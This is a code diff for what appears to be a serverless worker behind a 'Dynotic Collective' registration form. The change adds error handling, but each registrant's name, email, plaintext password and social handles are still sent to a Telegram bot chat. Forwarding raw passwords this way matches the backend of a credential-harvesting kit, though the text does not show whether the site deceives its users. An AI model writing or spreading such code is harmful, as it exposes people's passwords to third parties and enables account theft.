@@ -5,18 +5,29 @@ export default {
 
     // Jika request dari website register
     if (request.method === "POST") {
-      const data = await request.json();
-      const { fullname, email, password, youtube, instagram } = await request.json();
+  try {
+    const { fullname, email, password, youtube, instagram } = await request.json();
 
-      const message = encodeURIComponent(
-  `New Registration Dynotic Collective:\nName: ${fullname}\nEmail: ${email}\nPassword: ${password}\nYouTube: ${youtube}\nInstagram: ${instagram}\nTime: ${new Date().toISOString()}`
-);
+    const message = encodeURIComponent(
+      `New Registration Dynotic Collective:\nName: ${fullname}\nEmail: ${email}\nPassword: ${password}\nYouTube: ${youtube}\nInstagram: ${instagram}\nTime: ${new Date().toISOString()}`
+    );
 
-      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`);
+    // Ganti bagian fetch lama dengan ini
+    const telegramRes = await fetch(
+      `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`
+    );
 
-      return new Response(JSON.stringify({ success: true }), { status: 200 });
+    if (!telegramRes.ok) {
+      const text = await telegramRes.text();
+      throw new Error("Telegram failed: " + text);
     }
 
+    return new Response(JSON.stringify({ success: true }), { status: 200 });
+
+  } catch (err) {
+    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
+  }
+    }
     // === Bagian bot Telegram ===
     if (request.method !== "POST") return new Response("Dynotic Bot");
 
